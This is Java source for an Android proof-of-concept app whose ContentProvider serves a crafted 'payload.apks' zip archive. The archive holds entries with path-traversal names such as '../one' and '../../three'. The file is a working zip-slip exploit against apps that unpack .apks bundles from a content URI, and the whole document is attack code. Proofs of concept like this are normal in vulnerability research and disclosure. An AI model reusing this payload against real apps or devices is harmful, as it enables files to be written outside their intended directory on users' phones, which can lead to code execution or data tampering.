package poc.app;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.net.Uri;
import android.os.ParcelFileDescriptor;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class MyContentProvider extends ContentProvider {
    public boolean onCreate() {
        return true;
    }

    public int delete(Uri uri, String selection, String[] selectionArgs) {
        return 0;
    }

    public String getType(Uri uri) {
        return null;
    }

    public Uri insert(Uri uri, ContentValues values) {
        return null;
    }

    public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
        return null;
    }

    public int update(Uri uri, ContentValues values, String selection, String[] selectionArgs) {
        return 0;
    }

    public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {
        try {
            return ParcelFileDescriptor.open(createZip(), ParcelFileDescriptor.MODE_READ_ONLY);
        } catch (IOException e) {
            throw new FileNotFoundException(e.getMessage());
        }
    }

    private File createZip() throws IOException {
        File zipFile = new File(getContext().getDataDir(), "payload.apks");
        if (zipFile.exists()) {
            return zipFile;
        }
        try (ZipOutputStream out = new ZipOutputStream(new FileOutputStream(zipFile))) {
            out.putNextEntry(new ZipEntry("../one"));
            out.write("one".getBytes());

            out.putNextEntry(new ZipEntry("../../two"));
            out.write("two".getBytes());

            out.putNextEntry(new ZipEntry("../../../three"));
            out.write("three".getBytes());

            out.closeEntry();
        }
        return zipFile;
    }
}